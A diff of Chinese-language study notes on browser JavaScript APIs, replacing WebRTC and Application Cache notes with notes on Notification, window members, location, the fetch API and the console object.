-      pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
-      else
-      pc.addIceCandidate(new RTCIceCandidate(signal.candidate));
-    };
-    Chrome浏览器中为 webkitRTCPeerConnection ,
-    Firefox浏览器中为 mozRTCPeerConnection。
-    Google 维护一个函数库 adapter.js ,用来抽象掉浏览器之间的差异。
-  RTCDataChannel       进行任意数据的通信
-    作用是在点对点之间,传播任意数据。它的API与WebSockets的API相同。
-    Example:
-      var pc = new webkitRTCPeerConnection(servers, {
-        optional: [{RtpDataChannels: true}]
+    ◆Notification对象的属性和方法
+    Notification.permission  只读,用户给予的权限 
+      'default' 用户还没有做出许可,因此不会弹出通知 
+      'granted' 用户明确同意接收通知 
+      'denied'  用户明确拒绝接收通知 
+    Notification.requestPermission(foo)  获取用户授权
+      foo  回调函数,参数为 status[用户授权状态] 
+      Example: 若用户拒绝接收通知,用alert方法代替 
+        Notification.requestPermission(function (status) {
+          if (status === "granted") {
+            var n = new Notification("Hi!");
+          } 
+          else {
+            alert("Hi!");
+          }
+        });
+    var notice = new Notification(title [,options]);  生成一条通知
+      title   字符串,必须,用来指定通知的标题
+      options 对象,可选,用来设定各种设置
+        属性都是可读写的
+        dir   文字方向,
+          'auto'
+          'ltr'  从左到右
+          'rtl'  从右到左
+        lang  使用的语种
+          'en-US'
+          'zh-CN'
+          ...
+        body  通知内容,值为字符串,用来进一步说明通知的目的
+        tag   通知的ID,值为字符串 
+          一组相同tag的通知,不会同时显示,只会在用户关闭前一个通知后,在原位置显示。
+        icon  图表的URL,用来显示在通知上
+      Example:
+        var notice = new Notification('收到新邮件', {
+          body: '您总共有3封未读邮件。'
+        });
+        notice.title // "收到新邮件"
+        notice.body // "您总共有3封未读邮件。"
+      notice.title  通知标题
+      notice.body   通知内容
+    notice.close();    关闭通知
+      var n = new Notification("Hi!");
+      // 手动关闭
+      n.close();
+      // 自动关闭
+      n.onshow = function () { 
+        setTimeout(n.close.bind(n), 5000); 
+      }
+      上面代码说明,并不能从通知的close事件,判断它是否为用户手动关闭。
+    notice_event 通知对象的事件
+      show  通知显示给用户时触发
+      click 用户点击通知时触发
+      close 用户关闭通知时触发
+      error 通知出错时触发,大多数发生在通知无法正确显示时 
+      Example:
+        notice.onshow = function() {
+          console.log('Notification shown');
+        };
+  window.getSelection() 返回表示选中的文字的Selection对象 
+    PS:可通过连接一个空字符串 "" 或使用  toString() 方法,获取文本字符串, 
+      当该对象被传递给期望字符串作为参数的函数中时,如 window.alert 或 document.write,
+      对象的 toString() 方法会被自动调用,而不用手动转换.
+    var selectText = window.getSelection();  
+    var str1 = selectText + ''         获取选中的字符串
+    var str2 = selectText.toString();  获取选中的字符串
+    Example: 打印出文档中被选中的的文字 
+      $(document).mouseup(function (e) {
+        var txt = window.getSelection();
+        if (txt.toString().length >= 1) { 
+          console.log(txt);  // 返回一个对象
+          console.log(txt+''); // 返回选中的文字
+          console.log(txt.toString()); // 返回选中的文字
+          alert(txt); // 返回选中的文字
+        }
       });
-      pc.ondatachannel = function(event) {
-        receiveChannel = event.channel;
-        receiveChannel.onmessage = function(event){
-          document.querySelector("div#receive").innerHTML = event.data;
+  其他属性方法 
+    window.onload
+    window.offscreenBuffering 用于绘制新窗口内容并在完成后复制已存在的内容,控制屏幕更新
+  SpeechRecognitionEvent()  
+  SpeechRecognitionError()  
+  SpeechRecognition()  
+  SpeechGrammarList()  
+  SpeechGrammar()  
+  window.origin  str,如'http://tst.lcltst.com'  
+  window.name   
+  window.status   
+  window.frameElement   
+  window.external 
+  window.devicePixelRatio 
+  window.clientInformation 
+  window.defaultstatus   
+  styleMedia StyleMedia {type: "screen"}  
+  onanimationend    
+  onanimationiteration    
+  onanimationstart    
+  onsearch    
+  ontransitionend    
+  onwebkitanimationend    
+  onwebkitanimationiteration    
+  onwebkitanimationstart    
+  onwebkittransitionend    
+  isSecureContext   
+  ◆事件相关 
+    .onerror 见:Event 
+    .onstorage   Storage事件[仅IE支持] 
+      修改 localStorage 或 sessionStorage 时触发
+    ononline  网络从离线变成在线时触发,不冒泡[HTML5]   
+    onoffline  网络从在线变成离线时触发[HTML5]   
+    onabort    
+    onblur    
+    oncancel    
+    oncanplay    
+    oncanplaythrough    
+    onchange    
+    onclick    
+    onclose    
+    oncontextmenu    
+    oncuechange    
+    ondblclick    
+    ondrag    
+    ondragend    
+    ondragenter    
+    ondragleave    
+    ondragover    
+    ondragstart    
+    ondrop    
+    ondurationchange    
+    onemptied    
+    onended    
+    onfocus    
+    oninput    
+    oninvalid    
+    onkeydown    
+    onkeypress    
+    onkeyup    
+    onload    
+    onloadeddata    
+    onloadedmetadata    
+    onloadstart    
+    onmousedown    
+    onmouseenter    
+    onmouseleave    
+    onmousemove    
+    onmouseout    
+    onmouseover    
+    onmouseup    
+    onmousewheel    
+    onpause    
+    onplay    
+    onplaying    
+    onprogress    
+    onratechange    
+    onreset    
+    onresize    
+    onscroll    
+    onseeked    
+    onseeking    
+    onselect    
+    onstalled    
+    onsubmit    
+    onsuspend    
+    ontimeupdate    
+    ontoggle    
+    onvolumechange    
+    onwaiting    
+    onwheel    
+    ongotpointercapture    
+    onlostpointercapture    
+    onpointerdown    
+    onpointermove    
+    onpointerup    
+    onpointercancel    
+    onpointerover    
+    onpointerout    
+    onpointerenter    
+    onpointerleave    
+    onbeforeunload    
+    onhashchange    
+    onlanguagechange    
+    onmessage    
+    onmessageerror    
+    onpagehide    
+    onpageshow    
+    onpopstate    
+    onrejectionhandled    
+    onunhandledrejection    
+    onunload    
+  stop()    
+  open()    
+  alert()    
+  confirm()    
+  prompt()    
+  print()    
+  requestAnimationFrame()    
+  cancelAnimationFrame()    
+  requestIdleCallback()    
+  cancelIdleCallback()    
+  captureEvents()    
+  releaseEvents()    
+  getComputedStyle()    
+  matchMedia()    
+  moveTo()    
+  moveBy()    
+  resizeTo()    
+  resizeBy()    
+  getSelection()    
+  find()    
+  getMatchedCSSRules()    
+  webkitRequestAnimationFrame()    
+  webkitCancelAnimationFrame()    
+  btoa()    
+  atob()    
+  setTimeout()    
+  clearTimeout()    
+  setInterval()    
+  clearInterval()    
+  createImageBitmap()    
+  scroll()    
+  scrollTo()    
+  scrollBy()    
+  onappinstalled    
+  onbeforeinstallprompt    
+  ondevicemotion    
+  ondeviceorientation    
+  ondeviceorientationabsolute    
+  onauxclick    
+  openDatabase()  
+  待整理 
+    ByteLengthQueuingStrategy 
+    CountQueuingStrategy 
+    ReadableStream 
+    WritableStream 
+    SpeechSynthesisUtterance 
+    RemotePlayback 
+    PushSubscriptionOptions 
+    PushSubscription 
+    PushManager 
+    PresentationReceiver
+    PresentationConnectionList
+    PresentationRequest
+    PresentationConnectionCloseEvent
+    PresentationConnectionAvailableEvent 
+    PresentationConnection
+    PresentationAvailability
+    Presentation
+    PermissionStatus
+    Permissions
+    PaymentResponse
+    PaymentRequestUpdateEvent
+    PaymentRequest
+    PaymentAddress
+    Notification
+    CanvasCaptureMediaStreamTrack
+    PhotoCapabilities
+    ImageCapture
+    BudgetService
+    BroadcastChannel
+    XSLTProcessor
+    VisualViewport
+    SharedWorker
+    PerformancePaintTiming
+    PerformanceObserverEntryList
+    PerformanceObserver
+    PerformanceNavigationTiming
+    IntersectionObserverEntry
+    IntersectionObserver
+    StaticRange
+    DOMRectReadOnly
+    DOMRect
+    DOMQuad
+    DOMPointReadOnly
+    DOMPoint
+    DOMMatrixReadOnly
+    DOMMatrix
+    WaveShaperNode
+    TextEncoder
+    TextDecoder
+    SyncManager
+    SubtleCrypto
+    StorageManager
+    StereoPannerNode
+    SourceBufferList
+    SourceBuffer
+    ServiceWorkerRegistration
+    ServiceWorkerContainer
+    ServiceWorker
+    ScriptProcessorNode
+    ScreenOrientation
+    Response
+    Request
+    RTCStatsReport
+    RTCSessionDescription
+    RTCRtpReceiver
+    RTCRtpContributingSource
+    RTCPeerConnectionIceEvent
+    RTCPeerConnection
+    RTCIceCandidate
+    RTCDataChannelEvent
+    RTCDataChannel
+    RTCCertificate
+    Plugin
+    PluginArray
+    PeriodicWave
+    PannerNode
+    OscillatorNode
+    OfflineAudioContext
+    OfflineAudioCompletionEvent
+    NetworkInformation
+    NavigationPreloadManager
+    MimeType
+    MimeTypeArray
+    MIDIPort
+    MIDIOutputMap
+    MIDIOutput
+    MIDIMessageEvent
+    MIDIInputMap
+    MIDIInput
+    MIDIAccess
+    ImageBitmapRenderingContext
+    IIRFilterNode
+    IDBOpenDBRequest
+    IDBObjectStore
+    IDBKeyRange
+    IDBIndex
+    IDBCursorWithValue
+    IDBCursor
+    Headers
+    Gamepad
+    GamepadButton
+    GainNode
+    EventSource
+    DynamicsCompressorNode
+    DelayNode
+    DOMError
+    CryptoKey
+    Crypto
+    ConvolverNode
+    ConstantSourceNode
+    ChannelSplitterNode
+    ChannelMergerNode
+    CanvasRenderingContext2D
+    CacheStorage
+    Cache
+    BiquadFilterNode
+    BeforeInstallPromptEvent
+    BatteryManager
+    BaseAudioContext
+    Audio 
+    AudioScheduledSourceNode
+    AudioParam
+    AudioNode
+    AudioListener
+    AudioDestinationNode
+    AudioContext
+    AudioBufferSourceNode
+    AudioBuffer
+    AnalyserNode
+    XPathResult
+    XPathExpression
+    XPathEvaluator
+    Worker
+    ValidityState
+    VTTCue
+    URLSearchParams
+    TransitionEvent
+    TouchList
+    Touch
+    TimeRanges
+    TextTrackList
+    TextTrackCueList
+    TextTrackCue
+    TextTrack
+    TextMetrics
+    TaskAttributionTiming
+    ShadowRoot
+    SecurityPolicyViolationEvent
+    RadioNodeList
+    PromiseRejectionEvent
+    ProcessingInstruction
+    PerformanceTiming
+    PerformanceResourceTiming
+    PerformanceNavigation
+    PerformanceMeasure
+    PerformanceMark
+    PerformanceLongTaskTiming
+    PerformanceEntry
+    Performance
+    PageTransitionEvent
+    NodeFilter
+    MutationRecord
+    MessagePort
+    MessageChannel
+    InputDeviceCapabilities
+    ImageData
+    ImageBitmap
+    IdleDeadline
+    HashChangeEvent
+    FontFace
+    DOMParser
+    DOMException
+    CustomElementRegistry
+    CompositionEvent
+    ClipboardEvent
+    CSSViewportRule
+    CSSSupportsRule
+    CSSPageRule
+    CSSNamespaceRule
+    CSSMediaRule
+    CSSKeyframesRule
+    CSSKeyframeRule
+    CSSImportRule
+    CSSGroupingRule
+    CSSFontFaceRule
+    CSSConditionRule
+    CDATASection
+    BeforeUnloadEvent 
+    ApplicationCacheErrorEvent 
+    AnimationEvent
+    SpeechSynthesis
+    SharedArrayBuffer 
+    Atomics 
+    WebAssembly 
+window.location,管理URL 
+  PS: 修改URL都会生成一条历史记录[可前进后退], 且除hash外,页面也都会重载 
+    存在 Location 构造函数,但 location 的属性/方法都存在对象中,而非其原型中 
+  console.log(document.location === window.location); // true 
+  Member: 
+    .href   读写,整个url 
+      Example: 
+      location.href = 'https://www.baidu.com'; // 当前网页跳转到百度
+    .protocol  协议[通常是 http: 或 https:]
+    .host  读写,主机名:端口名[省略默认的80端口]
+    .hostname  读写,主机名/服务器名
+    .port  读写,端口号[若url中不包含端口号则返回'']
+    .pathname  读写,路径名(URL中的目录和文件名)
+    .search  读写,URL的查询字符串[以问号?开头的部分,包括?] 
+      Example:
+      'https://www.baidu.com/?key1=val1&key2=val2'
+      location.search;   // "?key1=val1&key2=val2"
+    .hash  读写URL锚点部分[#后面的部分][若无返回'']
+    .assign(url)  导航页面,并产生一条历史记录  
+      location.assign('https://www.baidu.com')    // 跳转到百度主页
+      对 window.location location.href 赋值则调用assign方法实现跳转  
+    .replace(url)  导航页面,不产生历史记录 
+      Example: :
+      location.replace('https://www.baidu.com'); // 跳转到百度
+    .reload([bol]) 重载当前页面 
+      PS: 位于 reload() 之后的代码不一定会执行,取决于网络延迟或系统资源等因素,
+        故推荐将其置于代码最后一行 
+      bol  是否无缓存重载,默认 false
+    .ancestorOrigins  DOMStringList,
+    .origin  
+    .toString() 
+    .valueOf() 
+window.fetch(),用来取代XMLHttpRequest的一种新规范 [IE不支持] 
+  PS: XMLHttpRequest对象,输入、输出状态都在同一接口管理,容易导致代码混乱;
+    Fetch主要有两个特点,一是接口合理化,Ajax是将所有不同性质的接口都放在XHR对象上,
+    而Fetch是将它们分散在几个不同的对象上,设计更合理；
+    二是Fetch操作返回Promise对象,避免了嵌套的回调函数.
+  检查浏览器是否部署 Fetch API
+    if (fetch in window){ /* 支持 */ } 
+    else { /* 不支持 */ }
+  Example: []
+    fetch(url).then(function (response) {
+      return response.json();
+    })
+    .then(function (jsonData) {
+      console.log(jsonData);
+    })
+    .catch(function () {
+      console.log('出错了');
+    });
+    
+    fetch(url,{
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: 'name=TG&love=1'
+    })
+    .then(function(response){})
+  stream数据流
+    数据传送是以数据流stream的形式进行的.
+    对于大文件,数据是一段一段得到的.
+    Example:
+      response.text().then(function (responseText) {
+        console.log(responseText);
+      }
+      上面代码中的text(),其实就是一个数据流读取器,并使用指定格式解读.
+    Fetch API提供以下五个数据流读取器.
+    .text()        返回字符串
+    .json()        返回一个JSON对象
+    .formData()    返回一个FormData对象
+    .blob()        返回一个blob对象
+    .arrayBuffer() 返回一个二进制数组
+    数据流只能读取一次,一旦读取,数据流就空了.
+    再次读取就不会得到结果.
+    解决方法是在读取之前,先使用.clone()方法,复制一份一模一样的副本.
+    
+    var url = 'LargeFile.txt';
+    var progress = 0;
+    var contentLength = 0;
+    
+    fetch(url).then(function (response) {
+      // 本次请求总的数据长度
+      contentLength = response.headers.get('Content-Length');
+      var getStream = function (reader) {
+        return reader.read().then(function (result) {
+          // 若数据已经读取完毕,直接返回
+          if (result.done) { return; }
+          
+          // 取出本段数据(二进制格式)
+          var chunk = result.value;
+          
+          var text = '';
+          // 假定数据是UTF-8编码,前三字节是数据头,
+          // 而且每个字符占据一个字节(即都为英文字符)
+          for (var i = 3; i < chunk.byteLength; i++) {
+            text += String.fromCharCode(chunk[i]);
+          }
+          
+          // 将本段数据追加到网页之中
+          document.getElementById('content').innerHTML += text;
+          
+          // 计算当前进度
+          progress += chunk.byteLength;
+          console.log(((progress / contentLength) * 100) + '%');
+          
+          // 递归处理下一段数据
+          return getStream(reader);
         };
       };
-      sendChannel = pc.createDataChannel("sendDataChannel", {reliable: false});
-      document.querySelector("button#send").onclick = function (){
-        var data = document.querySelector("textarea#send").value;
-        sendChannel.send(data);
-      };
-      Chrome 25、Opera 18 和Firefox 22 支持RTCDataChannel。
-  外部函数库 
-    由于API比较复杂,一般采用外部函数库进行操作。
-    目前,视频聊天的函数库有 SimpleWebRTC easyRTC webRTC.io,
-    点对点通信的函数库有PeerJS、Sharefest。
-    Example: SimpleWebRTC的示例
-      var webrtc = new WebRTC({
-        localVideoEl: 'localVideo',
-        remoteVideosEl: 'remoteVideos',
-        autoRequestMedia: true
-      });
-      webrtc.on('readyToCall', function () {
-          webrtc.joinRoom('My room name');
-      });
-    Example:PeerJS的示例
-      var peer = new Peer('someid', {key: 'apikey'});
-      peer.on('connection', function(conn) {
-        conn.on('data', function(data){
-          // Will print 'hi!'
+      return getStream(response.body.getReader());
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+    上面代码中,response.body.getReader()返回的就是数据流之中的一段.
+    上面这样的数据流处理,可以提高网站性能表现,减少内存占用,
+    对于请求大文件或者网速慢的场景相当有用.
+    传统的XMLHTTPRequest对象不支持数据流,所有的数据必须放在缓存里,
+    等到全部拿到后,再一次性吐出来.    
+  fetch() 方法
+    第一个参数可以是URL字符串,也可以是Request对象实例。
+    Fetch方法返回一个Promise对象,并将一个response对象传给回调函数。
+    response 对象
+      response.ok 属性
+        若返回的状态码在200到299之间(即请求成功),这个属性为true,否则为false。
+        因此,判断请求是否成功的代码可以写成下面这样。
+    
+    fetch('./api/some.json').then(function (response) {
+      if (response.ok) {
+        response.json().then(function (data) {
           console.log(data);
         });
+      } 
+      else {
+        console.log('请求失败,状态码为', response.status);
+      }
+    }
+    , function(err) {
+      console.log('出错:', err);
+    });
+    response对象除了json方法,还包含了服务器HTTP回应的元数据。
+    
+    fetch('users.json').then(function(response) {
+      console.log(response.headers.get('Content-Type'));
+      console.log(response.headers.get('Date'));
+      console.log(response.status);
+      console.log(response.statusText);
+      console.log(response.type);
+      console.log(response.url);
+    });
+    上面代码中,response对象有很多属性,
+    其中的 response.type 属性比较特别,表示HTTP回应的类型,它有以下三个值。
+    basic:正常的同域请求
+    cors:CORS机制下的跨域请求
+    opaque:非CORS机制下的跨域请求,这时无法读取返回的数据,也无法判断是否请求成功
+    若需要在CORS机制下发出跨域请求,需要指明状态。
+    fetch('http://some-site.com/cors-enabled/some.json', {mode: 'cors'})
+    .then(function(response) {
+      return response.text();
+    })
+    .then(function(text) {
+      console.log('Request successful', text);
+    })
+    .catch(function(error) {
+      log('Request failed', error)
+    });
+    除了指定模式,fetch方法的第二个参数还可以用来配置其他值,
+    比如指定cookie连同HTTP请求一起发出。
+    fetch(url, { credentials: 'include' })
+    
+    发出POST请求的写法如下。
+    fetch("http://www.example.org/submit.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "firstName=Nikhil&favColor=blue&password=easytoguess"
+    })
+    .then(function(res) {
+      if (res.ok) {
+        console.log("Perfect! Your settings are saved.");
+      } 
+      else if (res.status == 401) {
+        console.log("Oops! You are not authorized.");
+      }
+    }
+    , function(e) {
+      console.log("Error submitting form!");
+    });
+    目前,还有一些XMLHttpRequest对象可以做到,但是Fetch API还没做到的地方,
+    比如中途中断HTTP请求,以及获取HTTP请求的进度。
+    这些不足与Fetch返回的是Promise对象有关。    
+  Headers
+    Fetch API引入三个新的对象(也是构造函数):Headers, Request和Response。
+    其中,Headers对象用来构造/读取HTTP数据包的头信息。
+    
+    var content = 'Hello World';
+    var headers = new Headers();
+    headers.append("Accept", "application/json");
+    headers.append("Content-Type", "text/plain");
+    headers.append("Content-Length", content.length.toString());
+    headers.append("X-Custom-Header", "ProcessThisImmediately");
+    Headers对象的实例,除了使用append方法添加属性,也可以直接通过构造函数一次性生成。
+    
+    reqHeaders = new Headers({
+      "Content-Type": "text/plain",
+      "Content-Length": content.length.toString(),
+      "X-Custom-Header": "ProcessThisImmediately",
+    });
+    Headers对象实例还提供了一些工具方法。
+    
+    reqHeaders.has("Content-Type") // true
+    reqHeaders.has("Set-Cookie") // false
+    reqHeaders.set("Content-Type", "text/html")
+    reqHeaders.append("X-Custom-Header", "AnotherValue")
+    
+    reqHeaders.get("Content-Length") // 11
+    reqHeaders.getAll("X-Custom-Header") // ["ProcessThisImmediately", "AnotherValue"]
+    
+    reqHeaders.delete("X-Custom-Header")
+    reqHeaders.getAll("X-Custom-Header") // []
+    生成Header实例以后,可以将它作为第二个参数,传入Request方法。
+    
+    var headers = new Headers();
+    headers.append('Accept', 'application/json');
+    var request = new Request(URL, {headers: headers});
+    
+    fetch(request).then(function(response) {
+      console.log(response.headers);
+    });
+    同样地,Headers实例可以用来构造Response方法。
+    
+    var headers = new Headers({
+      'Content-Type': 'application/json',
+      'Cache-Control': 'max-age=3600'
+    });
+    
+    var response = new Response(
+      JSON.stringify({photos: {photo: []}}),
+      {'status': 200, headers: headers}
+    );
+    
+    response.json().then(function(json) {
+      insertPhotos(json);
+    });
+    上面代码中,构造了一个HTTP回应。
+    目前,浏览器构造HTTP回应没有太大用处,但是随着Service Worker的部署,
+    不久浏览器就可以向Service Worker发出HTTP回应。    
+  Request 对象,用来构造HTTP请求。
+    var req = new Request(url,options); 
+      var uploadReq = new Request("/uploadImage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "image/png",
+        },
+        body: "image data"
       });
+    .method  
+    .url  
+    .headers  
+    .referrer  
+    .referrerPolicy  
+    .mode  
+    .credentials  
+    .redirect  
+    .integrity  
+    .bodyUsed  
+    .clone()  
+    .arrayBuffer()  
+    .blob()  
+    .formData()  
+    .json()  
+    .text()  
+    req.method // "GET"
+    req.url // "http://example.com/index.html"
+    下面是另一个例子。
+    
+    var req = new Request(URL, {method: 'GET', cache: 'reload'});
+    fetch(req).then(function(response) {
+      return response.json();
+    })
+    .then(function(json) {
+      someOperator(json);
+    });
+    上面代码中,指定请求方法为GET,并且要求浏览器不得缓存response。
+    
+    Request对象实例有两个属性是只读的,不能手动设置。
+    一个是referrer属性,表示请求的来源,由浏览器设置,有可能是空字符串。
+    另一个是context属性,表示请求发出的上下文,
+    若是image,表示是从img标签发出,
+    若是worker,表示是从worker脚本发出,若是fetch,表示是从fetch函数发出的。
+    Request对象实例的mode属性,用来设置是否跨域,合法的值有以下三种:
+      same-origin、
+      no-cors(默认值)、
+      cors。
+      当设置为same-origin时,只能向同域的URL发出请求,否则会报错。
+    
+    var arbitraryUrl = document.getElementById("url-input").value;
+    fetch(arbitraryUrl, { mode: "same-origin" })
+    .then(function(res) {
+      console.log("Response succeeded?", res.ok);
+    }
+    ,function(e) {
+      console.log("Please enter a same-origin URL!");
+    });
+    上面代码中,若用户输入的URL不是同域的,将会报错,否则就会发出请求。
+    
+    若mode属性为no-cors,就与默认的浏览器行为没有不同,
+    类似script标签加载外部脚本文件、img标签加载外部图片。
+    若mode属性为cors,就可以向部署了CORS机制的服务器,发出跨域请求。
+    
+    var u = new URLSearchParams();
+    u.append('method', 'flickr.interestingness.getList');
+    u.append('api_key', '<insert api key here>');
+    u.append('format', 'json');
+    u.append('nojsoncallback', '1');
+    
+    var apiCall = fetch('https://api.flickr.com/services/rest?' + u);
+    
+    apiCall.then(function(response) {
+      return response.json().then(function(json) {
+        // photo is a list of photos.
+        return json.photos.photo;
+      });
+    })
+    .then(function(photos) {
+      photos.forEach(function(photo) {
+        console.log(photo.title);
+      });
+    });
+    上面代码是向Flickr API发出图片请求的例子。
+    
+    Request对象的一个很有用的功能,是在其他Request实例的基础上,生成新的Request实例。
+    
+    var postReq = new Request(req, {method: 'POST'});    
+  Response 
+    fetch方法返回Response对象实例,它有以下属性。
+    
+    status:整数值,表示状态码(比如200)
+    statusText:字符串,表示状态信息,默认是“OK”
+    ok:布尔值,表示状态码是否在200-299 的范围内
+    headers:Headers对象,表示HTTP回应的头信息
+    url:字符串,表示HTTP请求的网址
+    type:字符串,合法的值有五个basic、cors、default、error、opaque。basic表示正常的同域请求；cors表示CORS机制的跨域请求；error表示网络出错,无法取得信息,status属性为0,headers属性为空,并且导致fetch函数返回Promise对象被拒绝；opaque表示非CORS机制的跨域请求,受到严格限制。
+    Response对象还有两个静态方法。
+    
+    Response.error() 返回一个type属性为error的Response对象实例
+    Response.redirect(url, status) 返回的Response对象实例会重定向到另一个URL
+    fetch("https://example.com", init)
+    .then(function (response) {
+    // Check that the response is a 200
+      if (response.status === 200) {
+        alert("Content type: " + response.headers.get('Content-Type'));
+      }
+    });
+  body属性 
+    Request对象和Response对象都有body属性,表示请求的内容。body属性可能是以下的数据类型。
+    
+    ArrayBuffer
+    ArrayBufferView (Uint8Array等)
+    Blob/File
+    string
+    URLSearchParams
+    FormData
+    var form = new FormData(document.getElementById('login-form'));
+    fetch("/login", {
+      method: "POST",
+      body: form
+    })
+    上面代码中,Request对象的body属性为表单数据。
+    
+    Request对象和Response对象都提供以下方法,用来读取body。
+    
+    arrayBuffer()
+    blob()
+    json()
+    text()
+    formData()
+    注意,上面这些方法都只能使用一次,第二次使用就会报错,也就是说,body属性只能读取一次。Request对象和Response对象都有bodyUsed属性,返回一个布尔值,表示body是否被读取过。
+    
+    var res = new Response("one time use");
+    console.log(res.bodyUsed); // false
+    res.text().then(function(v) {
+      console.log(res.bodyUsed); // true
+    });
+    console.log(res.bodyUsed); // true
+    
+    res.text().catch(function(e) {
+      console.log("Tried to read already consumed Response");
+    });
+    上面代码中,第二次通过text方法读取Response对象实例的body时,就会报错。
+    
+    这是因为body属性是一个stream对象,数据只能单向传送一次。这样的设计是为了允许JavaScript处理视频、音频这样的大型文件。
+    
+    若希望多次使用body属性,可以使用Response对象和Request对象的clone方法。它必须在body还没有读取前调用,返回一个新的body,也就是说,需要使用几次body,就要调用几次clone方法。
+    
+    addEventListener('fetch', function(evt) {
+      var sheep = new Response("Dolly");
+      console.log(sheep.bodyUsed); // false
+      var clone = sheep.clone();
+      console.log(clone.bodyUsed); // false
+    
+      clone.text();
+      console.log(sheep.bodyUsed); // false
+      console.log(clone.bodyUsed); // true
+    
+      evt.respondWith(cache.add(sheep.clone()).then(function(e) {
+        return sheep;
+      });
+    });    
+console,用于调试的控制台对象  
+  PS: 由IE的JScript引擎提供的调试工具,后来逐渐成为浏览器的事实标准 
+    NodeJS沿用了这个标准,提供与习惯行为一致的console对象,
+    用于向标准输出流(stdout)或标准错误流(stderr)输出字符.
+  Member: 
+    .log([val1][, ...])   向标准输出流打印字符并以换行符结束
+      PS: 该方法接收若干个参数,若只有一个参数,则输出这个参数的字符串形式.
+        若有多个参数,则以类似于C语言 printf() 命令的格式输出
+      格式占位符
+        PS:log方法将占位符替换以后的内容,显示在console窗口
+        %s     字符串
+        %d     整数
+        %i     整数
+        %f     浮点数
+        %o     对象的链接
+        %c     CSS格式字符串
+          对输出的内容进行CSS渲染
+          console.log('%c this text is styled!','color:red;font-size:24px;');
+          输出的内容将显示为红色的24px的字体
+        Example:
+          console.log(" %s + %s = %s", 1, 1, 2);  //  1 + 1 = 2
+          上面代码的 %s 表示字符串的占位符
+
+          两种参数格式,可以结合在一起使用.
+          console.log(" %s + %s ", 1, 1, "= 2")
+          // 1 + 1  = 2
+    .info([val][, ...])   返回信息性消息 
+      这个命令与 console.log 差别并不大,
+      除了在chrome中只会输出文字外,其余的会显示一个蓝色的惊叹号.
+    .error([val1][, ...]) 输出错误消息 
+      控制台在出现错误时会显示是红色的叉子.
+    .warn([val1][, ...])  输出警告消息 
+      控制台出现有黄色的惊叹号 
+    .dir(obj[, options])  用来对一个对象进行检查[inspect],并以易于阅读和打印的格式显示 
+      可读性较好,一般用于输出显示DOM节点
+      Node中可指定以高亮形式输出
+        console.dir(obj,{color:true})
+    .trace(message[,...]) 当前执行的代码在堆栈中的调用路径 
+      这个测试函数运行很有帮助,只要给想测试的函数里面加入 console.trace 就行了.
+    .assert([bool][,val]) 用于判断某个表达式或变量是否为真 
+      PS:接收两个参数,第一个参数是表达式,第二个参数是字符串.
+        只有当第一个参数为false,才会输出第二个参数,否则不会有任何结果.
+      bool  布尔值,默认为false 
+      Example:
+        若为假,则显示一条事先指定的错误信息
+        console.assert(true === false,"判断条件不成立")
+        // Assertion failed: 判断条件不成立
+        判断子节点的个数是否大于等于500.
+        console.assert(list.childNodes.length < 500, "节点个数大于等于500")
+    .dirxml()             主要用于以目录树形式显示DOM节点
+      若参数不是DOM节点,则等同于dir
+    .table()              对于某些复合类型的数据将其转为表格显示
+      Example: :
+      var languages = [
+        { name: "JavaScript", fileExtension: ".js" },
+        { name: "TypeScript", fileExtension: ".ts" },
+        { name: "CoffeeScript", fileExtension: ".coffee" }
+      ];
+      console.table(languages);
+      上面代码的language,转为表格显示如下.
+     (index) name fileExtension
+      0 "JavaScript" ".js"
+      1 "TypeScript" ".ts"
+      2 "CoffeeScript" ".coffee"
+      复合型数据转为表格显示的条件是,必须拥有主键.
+        对于上面的数组来说,主键就是数字键.对于对象来说,主键就是它的最外层键.
+        var languages = {
+          csharp: { name: "C#", paradigm: "object-oriented" },
+          fsharp: { name: "F#", paradigm: "functional" }
+        };
+        console.table(languages);
+        上面代码的language,转为表格显示如下.
+       (index) name paradigm
+        csharp "C#" "object-oriented"
+        fsharp "F#" "functional"
+    .count([val])         用于计数,输出被调用的次数 
+      接收一个参数作为标签,进行相应的次数统计
+      Example:
+        console.count('a');  // a: 1
+        console.count('a');  // a: 2
       
-      // Connecting peer
-      var peer = new Peer('anotherid', {key: 'apikey'});
-      var conn = peer.connect('someid');
-      conn.on('open', function(){
-        conn.send('hi!');
+        for (var i = 0; i < 5; i++) { 
+          console.count(); 
+        }
+        // : 1
+        // : 2
+        // : 3
+        // : 4
+        // : 5
+    .clear()         清空控制台,光标回到第一行
+    ◆用于记录time和timeEnd间经历的时间,可计算一个操作所花费的准确时间 
+    .time()         计时开始
+    .timeEnd(val)   计时结束
+      val 为计时器的名称
+      Example:
+        console.time();
+        var array = new Array(1000000);
+        for(var i = array.length - 1; i >= 0; i--) {
+          array[i] = new Object();
+        };
+        console.timeEnd("aoo"); 
+        // aoo: 242ms
+      调用timeEnd方法之后,console窗口会显示'计时器名称: 所耗费的时间'.
+    ◆性能测试
+    .profile()     
+    .profileEnd()   
+    ◆分组显示
+    .group(val)   '组'的开始
+    .groupEnd()   '组'的结束 
+      str  作为'组'的名称
+      在group和groupEnd之间打印的信息可作为一个'组'进行展开或折叠,在输出大量信息时有用
+    ◆其他 
+    .debug(val)     Chrome不支持 
+  Expand: 
+    修改/定义console方法 
+      因为console对象的所有方法,都可以被覆盖
+      
+      使用自定义的console.log方法,在显示结果添加当前时间
+      ["log", "info", "error"].forEach(function(method) {
+        console[method] = console[method].bind(console,new Date().toISOString());
       });
-'Application Cache'应用离线缓存: 让Web应用在离线状态下可继续使用 [HTML5]
-  PS: 通过manifest文件指明需要缓存的资源; 移动端支持度比较好;
-  指定页面缓存: 
-    在文档的<html>标签中包含'manifest'属性,值为manifest文件的路径 
-    若未指定manifest属性,则页面不会被缓存,除非在manifest文件中直接指定了该页面;
-  'xx.appcache'manifest文件: 
-    PS: 需在web服务器上配置正确的 MIME-type,即 "text/cache-manifest"; 
-    CACHE MANIFEST # 此标题下列出的文件将在首次下载后进行缓存 
-      # 2012-02-21 v1.0.0
-      CACHE:
-      /theme.css
-      /logo.gif
-      /main.js
-    NETWORK:       # 此标题下列出的文件需要与服务器的连接,且不会被缓存 
-      # 每次重新拉取的文件
